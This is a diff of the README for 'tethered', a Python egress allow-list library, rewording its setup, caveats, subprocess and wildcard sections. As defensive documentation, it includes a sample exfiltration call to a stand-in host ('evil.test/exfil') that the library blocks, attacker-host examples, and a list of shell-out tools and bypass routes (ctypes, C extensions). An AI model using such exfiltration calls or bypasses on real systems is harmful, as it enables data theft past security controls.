@@ -24,7 +24,7 @@
   <a href="https://github.com/astral-sh/ty"><img src="https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/ty/main/assets/badge/v0.json" alt="ty"></a>
 </p>
 
-tethered is a lightweight, in-process policy check that hooks into Python's own socket layer to enforce your allow list before a connection is opened. Use `activate()` to set a process-wide ceiling, and `scope()` to tighten individual code paths — request handlers, background jobs, library calls, AI-generated code. Everything runs locally within your process. tethered sees whatever goes through Python's own `socket` module: requests, httpx, urllib3, aiohttp, asyncio on its standard event loop, and the pure-Python database and broker clients, under Django, Flask, FastAPI, Celery and the servers that run them. A library that resolves and connects inside its own C code (psycopg2, pycurl, grpcio) is not seen. The [compatibility page](https://github.com/shcherbak-ai/tethered/blob/main/docs/COMPATIBILITY.md) says what was measured, server by server and library by library.
+tethered is a lightweight, in-process policy check that hooks into Python's own socket layer to enforce your allow list before a connection is opened. Use `activate()` to set a process-wide ceiling, and `scope()` to tighten individual code paths — request handlers, background jobs, library calls, AI-generated code. Everything runs locally within your process.
 
 ```python
 import tethered
@@ -35,6 +35,8 @@ import urllib.request
 urllib.request.urlopen("https://api.stripe.com/v1/charges")  # works — matches *.stripe.com:443
 urllib.request.urlopen("https://evil.test/exfil")            # raises tethered.EgressBlocked
 ```
+
+tethered sees whatever goes through Python's own `socket` module: requests, httpx, urllib3, aiohttp, asyncio on its standard event loop, and the pure-Python database and broker clients, under Django, Flask, FastAPI, Celery and the servers that run them. A library that resolves and connects inside its own C code (psycopg2, pycurl, grpcio) is not seen. The [compatibility page](https://github.com/shcherbak-ai/tethered/blob/main/docs/COMPATIBILITY.md) says what was measured, server by server and library by library.
 
 ## Why tethered?
 
@@ -70,7 +72,7 @@ Requires Python 3.11+. Zero runtime dependencies. Pre-built wheels are available
 
 ## Quick start
 
-tethered has two complementary APIs. Both use the same allow list syntax (see below).
+tethered has two complementary APIs. Both use the same [allow list syntax](#allow-list-syntax).
 
 ### Enforce process-wide — `activate()`
 
@@ -86,13 +88,15 @@ from myapp import create_app
 app = create_app()
 ```
 
-This pattern works the same for Django, Flask, FastAPI, scripts, and AI-assisted workflows — activate tethered before your application and its dependencies start making connections. Existing connections (e.g., connection pools) established before `activate()` continue to work — tethered intercepts at connect time, not at read/write time. Worker processes that already exist are not reached either, so call `activate()` before the first process pool is created.
+This pattern works the same for Django, Flask, FastAPI, scripts, and AI-assisted workflows. Connections established before `activate()` (a connection pool, for example) continue to work — tethered intercepts at connect time, not at read/write time. Worker processes that already exist are not reached either, so call `activate()` before the first process pool is created.
 
-**Under asyncio, tethered runs on the standard event loop only.** An audit hook sees nothing that goes through a uvloop event loop, which uvicorn uses by default whenever it is installed (`uvicorn[standard]`, `fastapi run`). So tethered does not run next to it: with a policy active, `import uvloop` raises `ImportError`, and uvicorn falls back to the standard loop on its own; with uvloop already loaded, `activate()` raises `RuntimeError` and the server does not start. Which of the two you meet depends on the server and how it is started, so name the loop (`uvicorn main:app --loop asyncio`) or activate in a launcher script before the server is imported ([server setup](https://github.com/shcherbak-ai/tethered/blob/main/docs/COOKBOOK.md#servers-and-interpreter-pools), [details and remaining limits](https://github.com/shcherbak-ai/tethered/blob/main/SECURITY.md#what-tethered-does-not-protect-against)). A `log_only` policy refuses nothing, uvloop included, and reports nothing that goes through such a loop.
+Three things to know before you deploy:
 
-On Windows, asyncio's default `ProactorEventLoop` connects through calls that raise no audit event, so only DNS-time hostname checks apply there. Run the loop as `asyncio.SelectorEventLoop` for full enforcement ([details](https://github.com/shcherbak-ai/tethered/blob/main/SECURITY.md#what-tethered-does-not-protect-against)).
+- **Under asyncio, tethered runs on the standard event loop only.** An audit hook sees nothing that goes through a uvloop event loop, which uvicorn uses by default whenever it is installed (`uvicorn[standard]`, `fastapi run`), so tethered does not run next to it. With a policy active, `import uvloop` raises `ImportError`, and uvicorn falls back to the standard loop on its own; with uvloop already loaded, `activate()` raises `RuntimeError` and the server does not start. Which of the two you meet depends on the server and how it is started, so name the loop (`uvicorn main:app --loop asyncio`) or activate in a launcher script before the server is imported ([server setup](https://github.com/shcherbak-ai/tethered/blob/main/docs/COOKBOOK.md#servers-and-interpreter-pools)). A `log_only` policy refuses nothing, uvloop included, and reports nothing that goes through such a loop.
+- **On Windows, run asyncio on `asyncio.SelectorEventLoop`.** The default `ProactorEventLoop` connects through calls that raise no audit event, so only DNS-time hostname checks apply there.
+- **Use `locked=True` in production.** Replacing or deactivating the policy then requires the token you passed, and tampering with tethered's own code or the active policy is detected and fails closed. It is not a sandbox — [SECURITY.md](https://github.com/shcherbak-ai/tethered/blob/main/SECURITY.md#locked-mode--what-it-does-and-does-not-do) lists what it checks and what it does not stop.
 
-Use `locked=True` in production: replacing or deactivating the policy then requires the token you passed, and tampering with tethered's own code or the active policy is detected and fails closed. It is not a sandbox — [SECURITY.md](https://github.com/shcherbak-ai/tethered/blob/main/SECURITY.md#locked-mode--what-it-does-and-does-not-do) lists what it checks and what it does not stop. Full parameter list and locked-mode details: [docs/API.md](https://github.com/shcherbak-ai/tethered/blob/main/docs/API.md#tetheredactivate).
+Every parameter is in [docs/API.md](https://github.com/shcherbak-ai/tethered/blob/main/docs/API.md#tetheredactivate); the limits behind the first two points are in [SECURITY.md](https://github.com/shcherbak-ai/tethered/blob/main/SECURITY.md#what-tethered-does-not-protect-against).
 
 ### Restrict a code path — `scope()`
 
@@ -112,13 +116,15 @@ def charge(amount: int, token: str) -> dict:
 
 Also usable as a context manager (`with tethered.scope(allow=[...]):`). No `deactivate()` needed — cleanup is automatic. Works with sync and async functions. Generator functions cannot be decorated; inside a generator, scope each I/O call.
 
-`scope()` works on its own — no `activate()` required. When the app also called `activate()`, the effective policy is the **intersection** — a connection must be allowed by both. Scopes can only narrow, never widen. Under asyncio, a scope's DNS-time check does not see `loop.getaddrinfo` (it runs in an executor thread); the connection that follows is still checked. Full details: [docs/API.md](https://github.com/shcherbak-ai/tethered/blob/main/docs/API.md#tetheredscope).
+`scope()` works on its own — no `activate()` required. When the app also called `activate()`, the effective policy is the **intersection** — a connection must be allowed by both. Scopes can only narrow, never widen. A scope belongs to the thread or task that entered it; what that means for worker threads and for lookups under asyncio is in [docs/API.md](https://github.com/shcherbak-ai/tethered/blob/main/docs/API.md#tetheredscope).
 
-> **Package maintainers:** Use `scope()`, never `activate()`. Your library doesn't own the process — the app does. Pass `hint=` to attach a one-line egress contract (what hosts your library needs + docs link) to your scope; if a block ever fires — yours or the host's — the hint is readable as `exc.scope_hint` and appended to the exception message. See [docs/COOKBOOK.md](https://github.com/shcherbak-ai/tethered/blob/main/docs/COOKBOOK.md#surface-actionable-guidance-via-hint).
+> **Package maintainers:** Use `scope()`, never `activate()`. Your library doesn't own the process — the app does. Pass `hint=` to attach a one-line egress contract (the hosts your library needs, a docs link) to your scope: if a block fires while the scope is active, the hint is appended to the exception message and readable as `exc.scope_hint`. See the [cookbook](https://github.com/shcherbak-ai/tethered/blob/main/docs/COOKBOOK.md#for-package-authors).
 
 ### Subprocess control
 
-Python child processes (`multiprocessing.Pool`, `ProcessPoolExecutor`, gunicorn workers, plain `subprocess.run([sys.executable, ...])`) **automatically inherit** the parent's tethered policy. An active `scope()` travels too for children launched through `subprocess` (and for forked children); spawn-mode `multiprocessing` / `ProcessPoolExecutor` workers receive the global policy only. External launches — non-Python programs (curl, ffmpeg), different Python interpreters, `sys.executable` with `-S` (which disables `site.py`), or any Python child when tethered is not installed into site-packages (as with an editable install) — are governed by `external_subprocess_policy` (`"warn"` default, or `"block"`).
+Python child processes (`multiprocessing.Pool`, `ProcessPoolExecutor`, gunicorn workers, plain `subprocess.run([sys.executable, ...])`) **automatically inherit** the parent's tethered policy. An active `scope()` travels too for children launched through `subprocess` (and for forked children); spawn-mode `multiprocessing` / `ProcessPoolExecutor` workers receive the global policy only.
+
+Every other launch is *external* and is governed by `external_subprocess_policy` (`"warn"` by default, or `"block"`): non-Python programs (curl, ffmpeg), different Python interpreters, `sys.executable` with `-S` (which disables `site.py`), and any Python child when tethered is not installed into site-packages (as with an editable install).
 
 ```python
 import tethered, subprocess, sys
@@ -147,11 +153,11 @@ Full mechanics, locked-mode hardening, and the auto-vs-external rules: [docs/SUB
 | IPv6 CIDR | `"[2001:db8::]/32"` | Any IP in that IPv6 prefix |
 | IPv6 CIDR + port | `"[2001:db8::]/32:443"` | Any IP in that IPv6 prefix on port 443 only |
 
-**Wildcard matching:** Uses Python's `fnmatch` syntax. `*` matches any characters **including dots**, so `*.stripe.com` matches both `api.stripe.com` and `a.b.stripe.com`. This differs from TLS certificate wildcards. The characters `?` (single character) and `[seq]` (character set) are also supported. A rule may begin with `[seq]`: brackets are read as an IP literal only when they contain an IP address. A `*` pattern needs at least one literal character, and a `[...]` set does not count (`*[!/]` is rejected). Wildcards match text, not address ranges: `10.*` also allows `10.attacker.example` (a warning is logged once per rule), and wildcards over IPv6 text such as `fe80::*` are rejected. Use CIDR for ranges.
+**Wildcards** use Python's `fnmatch` syntax. `*` matches any characters **including dots**, so `*.stripe.com` matches both `api.stripe.com` and `a.b.stripe.com`. This differs from TLS certificate wildcards. The characters `?` (single character) and `[seq]` (character set) are also supported. Wildcards match text, not address ranges: `10.*` also allows `10.attacker.example`. Use CIDR for ranges.
 
-**Malformed rules raise `ValueError`** at `activate()` / `scope()` — for example a non-numeric or out-of-range port, text after `]`, an invalid prefix, a missing host, or the prefix inside the brackets (`[2001:db8::/32]`). One trailing dot on the host part is ignored (`api.example.com.`, `api.example.com.:443`). The full list is in [docs/API.md](https://github.com/shcherbak-ai/tethered/blob/main/docs/API.md#tetheredactivate).
+**Localhost** (`127.0.0.0/8`, `::1`) is allowed by default; pass `allow_localhost=False` to change that. The addresses `0.0.0.0` and `::` (INADDR_ANY) are treated as localhost.
 
-Localhost (`127.0.0.0/8`, `::1`) is always allowed by default. The addresses `0.0.0.0` and `::` (INADDR_ANY) are also treated as localhost. Malformed hostnames containing whitespace, control characters, or invisible Unicode are rejected and never matched by wildcard rules.
+**Malformed rules raise `ValueError`** at `activate()` / `scope()`; [docs/API.md](https://github.com/shcherbak-ai/tethered/blob/main/docs/API.md#rule-validation) lists what is rejected. Hostnames containing whitespace, control characters, or invisible Unicode are rejected and never matched by wildcard rules.
 
 ## Examples
 
@@ -193,17 +199,18 @@ This combination:
 
 - **Propagates the policy** to Python children of the same interpreter (multiprocessing workers, `subprocess.run`, and `asyncio.create_subprocess_exec` on the standard event loop). A child that cannot establish the locked policy refuses to start.
 - **Refuses external launches** (`curl`, `wget`, `bash`, other interpreters) made through Python's launch APIs — the "shell out to a binary that does the egress" route.
-- **Refuses the tampering it can see** — a launch whose environment carries a different `_TETHERED_CHILD_POLICY`, and Python-level deletion or overwrite of `tethered.pth`, raise `SubprocessBlocked`. A launch environment that merely lacks the variable is given it. Once tethered's own functions or policy objects have been replaced, socket operations and launches are refused until they are restored. Replacing or deactivating the policy requires the token, which is deliberately not kept here: a reference held in a module global can be found by other code in the process. Keep one only if you need to unlock.
+- **Refuses the tampering it can see.** A launch whose environment carries a different `_TETHERED_CHILD_POLICY`, and Python-level deletion or overwrite of `tethered.pth`, raise `SubprocessBlocked`; a launch environment that merely lacks the variable is given it. Once tethered's own functions or policy objects have been replaced, socket operations and launches are refused until they are restored.
+- **Cannot be unlocked.** Replacing or deactivating the policy requires the token, which is deliberately not kept here: a reference held in a module global can be found by other code in the process. Keep one only if you need to unlock.
 
-Activate **before** importing any third-party code — anything that runs in the unprotected window (e.g., during a malicious package's `__init__.py`) is unprotected. None of these settings reaches a library that [connects in C](https://github.com/shcherbak-ai/tethered/blob/main/docs/COMPATIBILITY.md#client-libraries), and `external_subprocess_policy="block"` also refuses the helper programs some libraries launch when they are imported, so import those first ([details](https://github.com/shcherbak-ai/tethered/blob/main/docs/SUBPROCESS.md#what-block-also-refuses)). tethered does not protect against `ctypes` / `cffi` raw syscalls, and locked mode is not a sandbox: Python code written against tethered can still defeat it ([what it does and does not do](https://github.com/shcherbak-ai/tethered/blob/main/SECURITY.md#locked-mode--what-it-does-and-does-not-do)). Pair with OS-level controls (seccomp, containers, network namespaces) for hard isolation.
+Activate **before** importing any third-party code — anything that runs in the unprotected window (e.g., during a malicious package's `__init__.py`) is unprotected. `external_subprocess_policy="block"` also refuses the helper programs some libraries launch when they are imported, so import those first ([details](https://github.com/shcherbak-ai/tethered/blob/main/docs/SUBPROCESS.md#what-block-also-refuses)).
 
 ## Defense-in-depth
 
-> tethered is a **guardrail at the Python audit-event layer, not a sandbox**. Code that uses `ctypes`, `cffi`, subprocesses, or C extensions with direct syscalls can bypass it, and ordinary database drivers and HTTP clients built on a C library are such extensions. For hardened environments combine with OS-level controls (containers, seccomp, network namespaces). See [SECURITY.md](https://github.com/shcherbak-ai/tethered/blob/main/SECURITY.md) for the full threat model.
+> tethered is a **guardrail at the Python audit-event layer, not a sandbox**. Code that uses `ctypes`, `cffi`, subprocesses, or C extensions with direct syscalls can bypass it, and ordinary database drivers and HTTP clients built on a C library [connect in C](https://github.com/shcherbak-ai/tethered/blob/main/docs/COMPATIBILITY.md#client-libraries) without meaning to bypass anything. Locked mode does not change that: Python code written against tethered can still defeat it ([what it does and does not do](https://github.com/shcherbak-ai/tethered/blob/main/SECURITY.md#locked-mode--what-it-does-and-does-not-do)). For hardened environments combine tethered with OS-level controls (containers, seccomp, network namespaces). See [SECURITY.md](https://github.com/shcherbak-ai/tethered/blob/main/SECURITY.md) for the full threat model.
 
 ## Performance
 
-The audit hook runs on every relevant socket event, but per-event cost is small — TCP handshake, TLS, and application logic dominate real-world connect time. The hook fires whenever tethered is engaged, whether you entered via `activate()` or `scope()`, so the per-call overheads below apply to both. Measured on CPython 3.13 / localhost / default benchmark settings (3,000 TCP-connect iterations × median-of-3, 5,000 per-event iterations):
+The audit hook runs on every relevant socket event, but per-event cost is small — TCP handshake, TLS, and application logic dominate real-world connect time. The overheads below apply whether tethered was engaged through `activate()` or `scope()`. Measured on CPython 3.13 / localhost / default benchmark settings (3,000 TCP-connect iterations × median-of-3, 5,000 per-event iterations):
 
 | Operation | Overhead added |
 |---|---|
@@ -218,10 +225,11 @@ Numbers vary by hardware, OS, and Python version. Reproduce with [`python benchm
 
 - [docs/API.md](https://github.com/shcherbak-ai/tethered/blob/main/docs/API.md) — full API reference (`activate`, `scope`, `deactivate`, exceptions, locked mode, log-only)
 - [docs/SUBPROCESS.md](https://github.com/shcherbak-ai/tethered/blob/main/docs/SUBPROCESS.md) — subprocess auto-propagation, scope propagation, `external_subprocess_policy`
-- [docs/ARCHITECTURE.md](https://github.com/shcherbak-ai/tethered/blob/main/docs/ARCHITECTURE.md) — how the audit hook works, scope mechanics, C guardian
+- [docs/COOKBOOK.md](https://github.com/shcherbak-ai/tethered/blob/main/docs/COOKBOOK.md) — handling blocked connections (Django, FastAPI, Celery, retry decorators), what each server, task queue and pool needs, and patterns for package authors
 - [docs/COMPATIBILITY.md](https://github.com/shcherbak-ai/tethered/blob/main/docs/COMPATIBILITY.md) — what is enforced, what needs configuration and what is not seen, measured under real servers, task queues and client libraries
-- [docs/COOKBOOK.md](https://github.com/shcherbak-ai/tethered/blob/main/docs/COOKBOOK.md) — handling blocked connections in Django, FastAPI, Celery and retry decorators; what each server needs (uvicorn, gunicorn, hypercorn, granian, sanic, uWSGI, mod_wsgi and others); task queues, process pools and interpreter pools
-- [SECURITY.md](https://github.com/shcherbak-ai/tethered/blob/main/SECURITY.md) — threat model, what tethered does and does not protect against
+- [docs/ARCHITECTURE.md](https://github.com/shcherbak-ai/tethered/blob/main/docs/ARCHITECTURE.md) — how the audit hook works, scope mechanics, C guardian
+- [SECURITY.md](https://github.com/shcherbak-ai/tethered/blob/main/SECURITY.md) — threat model, what tethered does and does not protect against, reporting a vulnerability
+- [CONTRIBUTING.md](https://github.com/shcherbak-ai/tethered/blob/main/CONTRIBUTING.md) — development setup and guidelines
 - [examples/](https://github.com/shcherbak-ai/tethered/tree/main/examples) — runnable scripts for every feature
 
 ## Badge
@@ -233,14 +241,6 @@ Using tethered in your project? Add the badge to your README:
 ```
 
 [![egress: tethered](https://img.shields.io/badge/egress-tethered-orange?labelColor=4B8BBE)](https://github.com/shcherbak-ai/tethered)
-
-## Contributing
-
-See [CONTRIBUTING.md](https://github.com/shcherbak-ai/tethered/blob/main/CONTRIBUTING.md) for development setup and guidelines.
-
-## Security
-
-See [SECURITY.md](https://github.com/shcherbak-ai/tethered/blob/main/SECURITY.md) for reporting vulnerabilities and the full threat model.
 
 ## License
 
